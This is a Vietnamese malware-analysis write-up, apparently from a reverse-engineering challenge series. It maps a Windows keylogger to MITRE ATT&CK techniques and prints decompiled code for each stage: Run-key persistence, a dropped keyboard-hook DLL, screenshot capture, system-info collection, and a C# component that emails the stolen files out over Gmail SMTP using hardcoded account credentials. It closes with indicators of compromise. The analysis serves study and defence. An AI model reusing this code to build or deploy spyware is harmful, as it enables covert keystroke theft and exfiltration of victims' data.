---
title: "Chall 18 - Sample 1 (phân tích mẫu .NET)"
date: 2023-09-12 18:43:00 +0700
categories: ["Technique Reverse", "Ghi chép 2023"]
tags: [reverse-engineering, malware, dotnet]
render_with_liquid: false
---
# OVERVIEW

![img](/assets/img/technique-reverse/chall-18-sample-1/img/overview.png)

# ATT&CK

## TA0002 Execution
### Shared Modules T1129

- Link function at runtime on Windows
- Link many functions at runtime
### Technique

- Hacker có thể thực thi các tải trọng độc hại thông qua việc tải các mô-đun được chia sẻ. Trình tải mô-đun Windows có thể được hướng dẫn để tải các tệp DLL từ các đường dẫn cục bộ tùy ý và các đường dẫn mạng Quy ước đặt tên phổ quát (UNC) tùy ý. Chức năng này nằm trong NTDLL.dll và là một phần của Windows Native API được gọi từ các hàm như CreateProcess, LoadLibrary, v.v. của API Win32. Trình tải mô-đun có thể tải các tệp DLL: thông qua đặc tả của tên đường dẫn DLL (đủ điều kiện hoặc tương đối) trong thư mục NHẬP KHẨU; thông qua EXPORT được chuyển tiếp tới một DLL khác, được chỉ định bằng tên đường dẫn (đủ điều kiện hoặc tương đối) (nhưng không có phần mở rộng); thông qua một đường nối NTFS hoặc liên kết tượng trưng chương trình.exe.local với tên đường dẫn tương đối hoặc đủ điều kiện của một thư mục chứa các tệp DLL được chỉ định trong thư mục NHẬP hoặc XUẤT được chuyển tiếp; thông qua <file name="filename.extension" tảiFrom="tên đường dẫn tương đối hoặc đủ điều kiện"> trong "bản kê khai ứng dụng" được nhúng hoặc bên ngoài. Tên tệp đề cập đến một mục trong thư mục NHẬP hoặc XUẤT được chuyển tiếp. Hacker có thể sử dụng chức năng này như một cách để thực thi tải trọng tùy ý trên hệ thống nạn nhân. Ví dụ: phần mềm độc hại có thể thực thi các mô-đun chia sẻ để tải các thành phần hoặc tính năng bổ sung.

### Chi tiết thêm thông tin về Technique

- https://attack.mitre.org/tactics/TA0002/
- https://attack.mitre.org/techniques/T1129/

## TA0003 Persistence
### T1547.001 Registry Run Keys / Startup Folder 
- Persist via Run registry key
### T1574.002 DLL Side-Loading 
- Tries to load missing DLLs
### Technique

- Hacker đang cố gắng duy trì chỗ đứng của mình. Sự kiên trì bao gồm các kỹ thuật mà Hacker sử dụng để giữ quyền truy cập vào hệ thống trong quá trình khởi động lại, thông tin đăng nhập đã thay đổi và các hoạt động gián đoạn khác có thể cắt đứt quyền truy cập của họ. Các kỹ thuật được sử dụng để duy trì tính bền vững bao gồm mọi thay đổi về quyền truy cập, hành động hoặc cấu hình cho phép chúng duy trì chỗ đứng trên hệ thống, chẳng hạn như thay thế hoặc chiếm quyền điều khiển mã hợp pháp hoặc thêm mã khởi động.

### Chi tiết thêm thông tin về Technique

- https://attack.mitre.org/tactics/TA0003/
- https://attack.mitre.org/techniques/T1547/001/
- https://attack.mitre.org/techniques/T1574/002/

## TA0004 Privilege Escalation
### T1055 Process Injection 
- May try to detect the Windows Explorer process (often used for injection)

### T1547.001 Registry Run Keys / Startup Folder 
- Persist via Run registry key

### T1574.002 DLL Side-Loading 
- Tries to load missing DLLs
### Technique

- Hacker đang cố gắng giành được quyền cấp cao hơn. Nâng cao đặc quyền bao gồm các kỹ thuật mà đối thủ sử dụng để có được quyền cấp cao hơn trên hệ thống hoặc mạng. Hacker thường có thể xâm nhập và khám phá mạng với quyền truy cập không có đặc quyền nhưng yêu cầu quyền cao hơn để thực hiện các mục tiêu của chúng. Các cách tiếp cận phổ biến là lợi dụng điểm yếu, cấu hình sai và lỗ hổng của hệ thống. Ví dụ về quyền truy cập nâng cao bao gồm: * HỆ THỐNG/cấp độ gốc * quản trị viên cục bộ * tài khoản người dùng có quyền truy cập giống như quản trị viên * tài khoản người dùng có quyền truy cập vào hệ thống cụ thể hoặc thực hiện chức năng cụ thể. Các kỹ thuật này thường trùng lặp với các kỹ thuật Kiên trì, vì các tính năng của hệ điều hành cho phép Hacker tồn tại có thể thực thi trong bối cảnh nâng cao.

### Chi tiết thêm thông tin về Technique

- https://attack.mitre.org/tactics/TA0004/
- https://attack.mitre.org/techniques/T1055/
- https://attack.mitre.org/techniques/T1547/001/
- https://attack.mitre.org/techniques/T1574/002/


## TA0005 Defense Evasion

### T1036 Masquerading

- Creates files inside the user directory

### T1055 Process Injection

- May try to detect the Windows Explorer process (often used for injection)

### T1222 File and Directory Permissions Modification

- Set file attributes

### T1497 Virtualization/Sandbox Evasion

- Contains long sleeps (>= 3 min)

- May sleep (evasive loops) to hinder dynamic analysis

- Contains medium sleeps (>= 30s)

### T1497.001 System Checks

- Reference anti-VM strings

### T1562.001 Disable or Modify Tools

- Creates guard pages, often used to prevent reverse engineering and debugging

### T1564.003 Hidden Window

- Hide graphical window

### T1574.002 DLL Side-Loading

- Tries to load missing DLLs

### Technique

- Hacker đang cố gắng tránh bị phát hiện. Phòng thủ Lẩn tránh bao gồm các kỹ thuật mà đối thủ sử dụng để tránh bị phát hiện trong suốt quá trình thỏa hiệp của họ. Các kỹ thuật được sử dụng để trốn tránh phòng thủ bao gồm gỡ cài đặt/vô hiệu hóa phần mềm bảo mật hoặc làm xáo trộn/mã hóa dữ liệu và tập lệnh. Hacker cũng tận dụng và lạm dụng các quy trình đáng tin cậy để ẩn giấu và giả mạo phần mềm độc hại của chúng. Các kỹ thuật của chiến thuật khác được liệt kê chéo ở đây khi những kỹ thuật đó bao gồm lợi ích bổ sung là phá vỡ hàng phòng thủ.

### Chi tiết thêm thông tin về Technique

- https://attack.mitre.org/tactics/TA0005/
- https://attack.mitre.org/techniques/T1036/
- https://attack.mitre.org/techniques/T1055/
- https://attack.mitre.org/techniques/T1222/
- https://attack.mitre.org/techniques/T1497/
- https://attack.mitre.org/techniques/T1497/001/
- https://attack.mitre.org/techniques/T1562/001/
- https://attack.mitre.org/techniques/T1564/003/
- https://attack.mitre.org/techniques/T1574/002/

## TA0006 Credential Access

### T1056 Input Capture

- Installs a global keyboard hook.

- Sample has functionality to log and monitor keystrokes, analyze it with the keystroke simulation cookbook.

### T1056.001 Keylogging

- Log keystrokes via application hook.

### Technique

- Hacker đang cố gắng đánh cắp tên tài khoản và mật khẩu. Quyền truy cập thông tin xác thực bao gồm các kỹ thuật lấy cắp thông tin xác thực như tên tài khoản và mật khẩu. Các kỹ thuật được sử dụng để lấy thông tin xác thực bao gồm keylogging hoặc bán phá giá thông tin xác thực. Việc sử dụng thông tin xác thực hợp pháp có thể cung cấp cho đối thủ quyền truy cập vào hệ thống, khiến chúng khó bị phát hiện hơn và tạo cơ hội tạo nhiều tài khoản hơn để giúp đạt được mục tiêu của chúng.

### Chi tiết thêm thông tin về Technique

- https://attack.mitre.org/tactics/TA0006/
- https://attack.mitre.org/techniques/T1056/
- https://attack.mitre.org/techniques/T1056/001/


## TA0007 Discovery

### T1012 Query Registry

- Query or enumerate registry value

- Query or enumerate registry key

### T1018 Remote System Discovery

- Reads the hosts file

### T1057 Process Discovery

- May try to detect the Windows Explorer process (often used for injection)

### T1082 System Information Discovery

- Get CPU information

- Queries the volume information (name, serial number etc) of a device

- Queries information about the installed CPU (vendor, model number etc)

- Queries the cryptographic machine GUID

- Reads software policies

### T1083 File and Directory Discovery

- Get common file path

### T1497 Virtualization/Sandbox Evasion

- Contains long sleeps (>= 3 min)

- May sleep (evasive loops) to hinder dynamic analysis

- Contains medium sleeps (>= 30s)

### T1497.001 System Checks

- Reference anti-VM strings

### T1518 Software Discovery

- Get installed programs

### T1518.001 Security Software Discovery

- May try to detect the virtual machine to hinder analysis (VM artifact strings found in memory)

### Technique

- Hacker đang cố gắng tìm hiểu môi trường của bạn. Khám phá bao gồm các kỹ thuật mà đối thủ có thể sử dụng để thu thập kiến ​​thức về hệ thống và mạng nội bộ. Những kỹ thuật này giúp đối thủ quan sát môi trường và tự định hướng trước khi quyết định hành động như thế nào. Chúng cũng cho phép đối thủ khám phá những gì họ có thể kiểm soát và những gì xung quanh điểm vào của họ để khám phá xem nó có thể mang lại lợi ích như thế nào cho mục tiêu hiện tại của họ. Các công cụ hệ điều hành gốc thường được sử dụng cho mục tiêu thu thập thông tin sau thỏa thuận này.

### Chi tiết thêm thông tin về Technique

- https://attack.mitre.org/tactics/TA0007/
- https://attack.mitre.org/techniques/T1012/
- https://attack.mitre.org/techniques/T1018/    
- https://attack.mitre.org/techniques/T1057/
- https://attack.mitre.org/techniques/T1082/
- https://attack.mitre.org/techniques/T1083/
- https://attack.mitre.org/techniques/T1497/
- https://attack.mitre.org/techniques/T1497/001/
- https://attack.mitre.org/techniques/T1518/
- https://attack.mitre.org/techniques/T1518/001/

## TA0009 Collection

### T1056 Input Capture

- Installs a global keyboard hook

- Sample has functionality to log and monitor keystrokes, analyze it with the keystroke simulation cookbook

### T1056.001 Keylogging

- Log keystrokes via application hook

### T1113 Screen Capture

- Capture screenshot

### Technique

- Hacker đang cố gắng thu thập dữ liệu quan tâm cho mục tiêu của họ. Việc thu thập bao gồm các kỹ thuật mà đối thủ có thể sử dụng để thu thập thông tin và các nguồn thông tin được thu thập từ đó có liên quan đến việc theo đuổi các mục tiêu của đối thủ. Thông thường, mục tiêu tiếp theo sau khi thu thập dữ liệu là đánh cắp (lọc) dữ liệu. Các nguồn mục tiêu phổ biến bao gồm nhiều loại ổ đĩa, trình duyệt, âm thanh, video và email. Các phương pháp thu thập phổ biến bao gồm chụp ảnh màn hình và nhập liệu bằng bàn phím.

### Chi tiết thêm thông tin về Technique

- https://attack.mitre.org/tactics/TA0009/
- https://attack.mitre.org/techniques/T1056/
- https://attack.mitre.org/techniques/T1056/001/   
- https://attack.mitre.org/techniques/T1113/

## TA0011 Command and Control

### T1071Application Layer Protocol

- Uses SMTP (mail sending)

- Performs DNS lookups

### T1095 Non-Application Layer Protocol

- Performs DNS lookups

### T1571 Non-Standard Port

- Detected TCP or UDP traffic on non-standard ports

### Technique
- Hacker đang cố gắng liên lạc với các hệ thống bị xâm nhập để kiểm soát chúng. Chỉ huy và Kiểm soát bao gồm các kỹ thuật mà đối thủ có thể sử dụng để liên lạc với các hệ thống dưới sự kiểm soát của họ trong mạng nạn nhân. Hacker thường cố gắng bắt chước lưu lượng truy cập bình thường, dự kiến ​​để tránh bị phát hiện. Có nhiều cách mà Hacker có thể thiết lập quyền chỉ huy và kiểm soát với nhiều mức độ tàng hình khác nhau tùy thuộc vào cấu trúc mạng và khả năng phòng thủ của nạn nhân.

### Chi tiết thêm thông tin về Technique

- https://attack.mitre.org/tactics/TA0011/
- https://attack.mitre.org/techniques/T1071/
- https://attack.mitre.org/techniques/T1095/
- https://attack.mitre.org/techniques/T1571/

# Phân tích chi tiết
## Tạo thư mục EXPLORER

- Đầu tiên chương trình sẽ tạo cửa sổ windowns với tên 
    ```
    ConsoleWindow = GetConsoleWindow();
    ShowWindow(ConsoleWindow, 0);
    ```
    ![img1](/assets/img/technique-reverse/chall-18-sample-1/img/1.png)

- Tìm trong chương trình thư mục ở biến `file name` bằng cách gọi hàm `SHGetFolderPathW`.


- `Filename` mang giá trị `C:\Users\ndinh\AppData\Roaming`
    ```
    a = [0x43, 0x00, 0x3A, 0x00, 0x5C, 0x00, 0x55, 0x00, 0x73, 0x00, 
    0x65, 0x00, 0x72, 0x00, 0x73, 0x00, 0x5C, 0x00, 0x6E, 0x00, 
    0x64, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x68, 0x00, 0x5C, 0x00, 
    0x41, 0x00, 0x70, 0x00, 0x70, 0x00, 0x44, 0x00, 0x61, 0x00, 
    0x74, 0x00, 0x61, 0x00, 0x5C, 0x00, 0x52, 0x00, 0x6F, 0x00, 
    0x61, 0x00, 0x6D, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x67]

    filename = "".join(chr(c) for c in a)
    print(filename)

    C:\Users\ndinh\AppData\Roaming

    ```

- Tiếp theo nó sẽ tạo 1 folder tên là `Explorer`.
  
  ![img1](/assets/img/technique-reverse/chall-18-sample-1/img/2.png)

- `CreateDirectoryW(aC_0, 0);` tạo thư mục kia.

- `SetFileAttributesW(aC_0, 2u);` hàm này được dùng để tạo thuộc tính cho thư mục này là hàm bị ẩn.
    ```
    FILE_ATTRIBUTE_HIDDEN
    2 (0x2)
    Tệp hoặc thư mục bị ẩn. Nó không được bao gồm trong một danh sách thư mục thông thường.
    ```

## Tạo Unikey.exe
- Call hàm `sub_3E1220`.
    ```
    int sub_3E1220()
    {
    HKEY phkResult; // [esp+0h] [ebp-418h] BYREF
    WCHAR Filename[260]; // [esp+4h] [ebp-414h] BYREF
    WCHAR NewFileName[260]; // [esp+20Ch] [ebp-20Ch] BYREF

    memset(NewFileName, 0, sizeof(NewFileName));
    GetModuleFileNameW(0, Filename, 0x104u);
    swprintf_s(NewFileName, 0x104u, L"%s\\%s", aC_0, L"Unikey.exe");
    CopyFileExW(Filename, NewFileName, 0, 0, 0, 0);
    if ( RegCreateKeyExA(
            HKEY_LOCAL_MACHINE,
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0,
            0,
            0,
            0xF003Fu,
            0,
            &phkResult,
            0) )
    {
        return 0;
    }
    RegSetValueExW(phkResult, L"UniKey NT", 0, 1u, (const BYTE *)NewFileName, 0x104u);
    RegCloseKey(phkResult);
    return 1;
    }
    ```

    - Nó sẽ tạo 1 file `Unikey.exe` và sao chép tác vụ của `Explorer.exe` sang `Unikey.exe` sau đó sẽ ghi vào thư mục 
    `C:\Users\ndinh\AppData\Roaming\Explorer\Explorer.exe` nhưng nó sẽ đổi tên thành `C:\Users\ndinh\AppData\Roaming\Explorer\Unikey.exe` 

## Tạo Transfer.exe
- Sau đó nó sẽ tiếp tục quay lại hàm main ban đầu và ghi thêm 1 file `Transfer.exe` cũng sẽ ghi vào thư mục file name với đường dẫn là `C:\Users\ndinh\AppData\Roaming\Explorer\Transfer.exe`
    ```
    swprintf_s(WideCharStr, 0x104u, L"%s\\%s", FileName, L"Transfer.exe");
    ```
    ![img1](/assets/img/technique-reverse/chall-18-sample-1/img/3.png)

    - Sau khi đóng handle nó sẽ call đến hàm `sub_3E14F0` trong đây khi nhìn qua thì có thể thấy nó sẽ tạo file `systeminfo.txt` để ghi nội dung vào.

```
int sub_3E14F0()
{
HANDLE FileW; // esi
HKEY phkResult; // [esp+8h] [ebp-9E8h] BYREF
DWORD cbData; // [esp+Ch] [ebp-9E4h] BYREF
BYTE Data[1000]; // [esp+10h] [ebp-9E0h] BYREF
char Buffer[1000]; // [esp+3F8h] [ebp-5F8h] BYREF
WCHAR FileName[262]; // [esp+7E0h] [ebp-210h] BYREF

memset(FileName, 0, 520);
swprintf_s(FileName, 0x104u, L"%s\\%s", ::FileName, L"systeminfo.txt");
FileW = CreateFileW(FileName, 0xC0000000, 3u, 0, 2u, 0x80u, 0);
memset(Data, 0, sizeof(Data));
cbData = 1000;
if ( RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", 0, 0x20019u, &phkResult) )
{
    CloseHandle(FileW);
    return 0;
}
else
{
    RegQueryValueExA(phkResult, "ProcessorNameString", 0, 0, Data, &cbData);
    memset(Buffer, 0, sizeof(Buffer));
    sprintf_s(Buffer, 0x3E8u, "Vi xu ly %s\r\n", (const char *)Data);
    WriteFile(FileW, Buffer, strlen(Buffer), &cbData, 0);
    RegCloseKey(phkResult);
    sub_3E1930(FileW);
    CloseHandle(FileW);
    return 1;
}
}
```

## Tạo file Systeminfo
- Sau khi đóng key nó sẽ in ra cấu hình của máy tính.

    ![img](/assets/img/technique-reverse/chall-18-sample-1/img/4.png)

- Tiếp theo sẽ call đến hàm `sub_3E1930(FileW);` Sau khi nhìn qua hàm này có thể thấy nó sẽ lấy các giá trị của máy tính và lưu vào file systeminfo.txt

- Sau khi kết thúc hàm này quay trở về hàm vừa gọi để ghi vào file txt ta sẽ được nội dung của file txt hoàn chỉnh như sau:

    ![img](/assets/img/technique-reverse/chall-18-sample-1/img/5.png)

- Quay trở lại `main()` để tạo 1 luồng thực thi mới với `MessageBoxA` và hàm `sub_401320()` đây chính là hàm `keylog`. Nếu nó không call được hàm này sẽ hiện ra 
`MessageBoxA(0, "Can not install hook!", "Error", 0);`
    ```
    DWORD __stdcall StartAddress(LPVOID lpThreadParameter)
    {
    if ( !sub_3E1320() )
        MessageBoxA(0, "Can not install hook!", "Error", 0);
    while ( GetMessageW(&Msg, 0, 0, 0) )
    {
        TranslateMessage(&Msg);
        DispatchMessageW(&Msg);
    }
    return 0;
    }
    ```
# Tạo Keylog.dll
    - Phân tích hàm `sub_401320()` thì có thể thấy nó sẽ tạo 1 file với đường dẫn `C:\Users\ndinh\AppData\Roaming\Explorer\Keylog.dll`

    ```
    int sub_401320()
    {
    HRSRC ResourceW; // esi
    HGLOBAL Resource; // eax
    const void *v2; // ebx
    DWORD v3; // edi
    HANDLE FileW; // esi
    HMODULE ModuleHandleA; // eax
    HMODULE v7; // esi
    LRESULT (__stdcall *FillKeyboard)(int, WPARAM, LPARAM); // eax
    FARPROC SetGlobalHookHandle; // eax
    HINSTANCE v10; // [esp-8h] [ebp-224h]
    DWORD NumberOfBytesWritten; // [esp+Ch] [ebp-210h] BYREF
    WCHAR FileName[260]; // [esp+10h] [ebp-20Ch] BYREF

    memset(FileName, 0, sizeof(FileName));
    swprintf_s(FileName, 0x104u, L"%s\\%s", Buffer, L"KeyLog.dll");
    ResourceW = FindResourceW(0, (LPCWSTR)0x67, L"Dll");
    Resource = LoadResource(0, ResourceW);
    v2 = LockResource(Resource);
    v3 = SizeofResource(0, ResourceW);
    FileW = CreateFileW(FileName, 0x10000000u, 1u, 0, 2u, 0x80u, 0);
    WriteFile(FileW, v2, v3, &NumberOfBytesWritten, 0);
    CloseHandle(FileW);
    if ( !LoadLibraryW(FileName) )
    {
        MessageBoxA(0, "Can not load DLL file.", "Error", 0);
        return 0;
    }
    ModuleHandleA = GetModuleHandleA("KeyLog");
    v7 = ModuleHandleA;
    if ( !ModuleHandleA )
        return 0;
    v10 = ModuleHandleA;
    FillKeyboard = (LRESULT (__stdcall *)(int, WPARAM, LPARAM))GetProcAddress(ModuleHandleA, "FillKeyboard");
    dword_4181EC = (int)SetWindowsHookExW(2, FillKeyboard, v10, 0);
    if ( !dword_4181EC )
        return 0;
    SetGlobalHookHandle = GetProcAddress(v7, "SetGlobalHookHandle");
    if ( !SetGlobalHookHandle )
        return 0;
    ((void (__cdecl *)(int))SetGlobalHookHandle)(dword_4181EC);
    return 1;
    }
    ```
# Tạo thread để chạy song song với keylog
- Nhìn vào thread ta có thể biết được là đang chạy song song với hàm `sub_3E1790()` trong while.

    ![img](/assets/img/technique-reverse/chall-18-sample-1/img/6.png)

# Tạo 1 Screenshot màn hình để chụp lại màn hình máy tính người dùng.
- Tiếp theo sẽ có 1 vòng while như sau.
    ```
    while ( 1 )
    {
        sub_3E1790();
        system(MultiByteStr);
        Sleep(0x927C0u);
    }
    ``` 
- Nó call đến hàm `sub_3E1790()`. Trong hàm này gần như set up để sceenshot lại màn hình của chúng ta và ghi vào thư mục `C:\Users\ndinh\AppData\Roaming\Explorer\screen.jpeg`

    ![img](/assets/img/technique-reverse/chall-18-sample-1/img/7.png)

# Ghi keylog ra file Log
- Nội dung của file `Log` được ghi ra.
  
    ![img](/assets/img/technique-reverse/chall-18-sample-1/img/9.png)

# Chạy file Transfer.exe
- Trước khi sleep ở hàm while() nó sẽ call đến system thực hiện gọi cmd thực thi chạy file `Transfer.exe`.
  
    ![img](/assets/img/technique-reverse/chall-18-sample-1/img/11.png)

- Cùng phân tích tiếp 2 file `Transfer.exe` và `Unikey.exe` thì thấy file `Unikey.exe` được cop từ file gốc sang. Còn file `Transfer.exe` được biên dịch bằng `C#`. Vì vậy ta sẽ tiến hành phân tích file `C#` này bằng cách decompile chúng.

    ![img](/assets/img/technique-reverse/chall-18-sample-1/img/8.png)

- Sau khi decompile ta thu được nội dung file như sau:

    ![img](/assets/img/technique-reverse/chall-18-sample-1/img/10.png)

- Đầu tiên khai báo và khởi tạo biến name với giá trị là "%appdata%\\Explorer". Sau đó, dòng mã name = Environment.ExpandEnvironmentVariables(name); được sử dụng để mở rộng biến môi trường này, để nó trỏ đến đúng đường dẫn tới thư mục %appdata%\\Explorer.

- Tạo một đối tượng SmtpClient để gửi email thông qua máy chủ SMTP của Gmail với địa chỉ smtp.gmail.com và cổng 587. Điều này cho phép gửi email qua Gmail.

- Bật cơ chế SSL bằng cách đặt thuộc tính EnableSsl của smtpClient thành true, để đảm bảo tính an toàn trong quá trình gửi email.

- Xác thực với Gmail bằng cách đặt thông tin tài khoản Gmail vào đối tượng NetworkCredential. Tài khoản Gmail và mật khẩu được cung cấp trong đoạn mã này là anhthc95@gmail.com và 123456789@A.

- Tạo một đối tượng MailMessage để chứa thông tin về email, bao gồm địa chỉ người gửi và người nhận, chủ đề, và nội dung.

- Sử dụng WindowsIdentity.GetCurrent().Name để lấy tên người dùng hiện tại đang đăng nhập vào máy tính và kết hợp với dấu gạch ngang để tạo một chủ đề cho email.

- Lấy thời gian hiện tại và định dạng nó theo định dạng English và gán nó làm nội dung của email.

- Kiểm tra xem các tệp tin có tồn tại trong thư mục được chỉ định (name) và đính kèm chúng vào email nếu tồn tại. Cụ thể, kiểm tra xem các tệp tin screen.jpeg, Log.txt, và systeminfo.txt có tồn tại hay không và đính kèm chúng nếu có.

- Gửi email bằng cách sử dụng đối tượng smtpClient.

- Bắt lỗi trong trường hợp có bất kỳ lỗi nào xảy ra trong quá trình gửi email, và không thực hiện bất kỳ hành động nào khác.


# IOC

```
Files Written
When executing the file being studied, it wrote to the following files.
C:\Documents and Settings\Administrator\Application Data\Explorer\KeyLog.dll
C:\Documents and Settings\Administrator\Application Data\Explorer\Transfer.exe
C:\Documents and Settings\Administrator\Application Data\Explorer\Unikey.exe
C:\Documents and Settings\Administrator\Application Data\Explorer\screen.jpeg
C:\Documents and Settings\Administrator\Application Data\Explorer\systeminfo.txt
C:\Users\<USER>\AppData\Roaming\Explorer\KeyLog.dll
C:\Users\<USER>\AppData\Roaming\Explorer\Transfer.exe
C:\Users\<USER>\AppData\Roaming\Explorer\Unikey.exe
C:\Users\<USER>\AppData\Roaming\Explorer\systeminfo.txt
C:\Users\user\AppData\Local\Microsoft\CLR_v2.0\UsageLogs
C:\Users\user\AppData\Local\Microsoft\CLR_v2.0\UsageLogs\Transfer.exe.log
C:\Users\user\AppData\Roaming
C:\Users\user\AppData\Roaming\Explorer
C:\Users\user\AppData\Roaming\Explorer\KeyLog.dll
C:\Users\user\AppData\Roaming\Explorer\Log.txt
C:\Users\user\AppData\Roaming\Explorer\Transfer.exe
C:\Users\user\AppData\Roaming\Explorer\Unikey.exe
C:\Users\user\AppData\Roaming\Explorer\Unikey.exe:Zone.Identifier
C:\Users\user\AppData\Roaming\Explorer\Unikey.exe\:Zone.Identifier:$DATA
C:\Users\user\AppData\Roaming\Explorer\screen.jpeg
C:\Users\user\AppData\Roaming\Explorer\systeminfo.txt
\Device\ConDrv\\Connect
```

# Mục tiêu của malware

- Malware sẽ thực hiện tạo thư mục Explorer ẩn trong `C:\Users\ndinh\AppData\Roaming\Explorer` sau đó tiến hành khởi tạo `Unikey.exe` được coi là 1 `Explorer.exe` thứ 2 có tác vụ y hệt `Explorer.exe`. Sau đó nó sẽ tạo ra file `Systeminfo.txt` dùng để lấy thông tin về máy tính và các ứng dụng đang được cài đặt trên máy tính. Tiếp theo nó sẽ chụp lại ảnh màn hình nạn nhân đang sử dụng. Có 1 thread riêng để tạo `keyloger` và ghi lại các tác vụ của nạn nhân qua file `Log`. Cuối cùng nó sẽ send tất cả thông tin trên đến địa chỉ mail của hacker qua `Transfer.exe` được 1 thread khởi chạy trong hệ thống.
